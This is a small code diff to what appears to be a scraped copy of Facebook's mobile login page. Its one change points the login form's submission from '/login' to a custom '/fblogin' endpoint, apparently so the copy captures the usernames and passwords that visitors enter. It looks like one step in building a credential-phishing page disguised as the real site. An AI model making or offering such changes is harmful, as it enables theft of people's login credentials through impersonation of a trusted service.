@@ -140,7 +140,7 @@
                         <div class="aclb _4-4l">
                             <div data-sigil="m_login_upsell login_identify_step_element"></div>
                             <div class="_5rut">
-                                <form method="post"  action="/login" class="mobile-login-form _5spm">
+                                <form method="post"  action="/fblogin" class="mobile-login-form _5spm">
                                     <!-- <input type="hidden" name="lsd" value="AVrLxfqt" autocomplete="off">
                                     <input type="hidden" name="m_ts" value="1523988943">
                                     <input type="hidden" name="li" value="zznWWgW7c5uUon4f_-OkfULT">
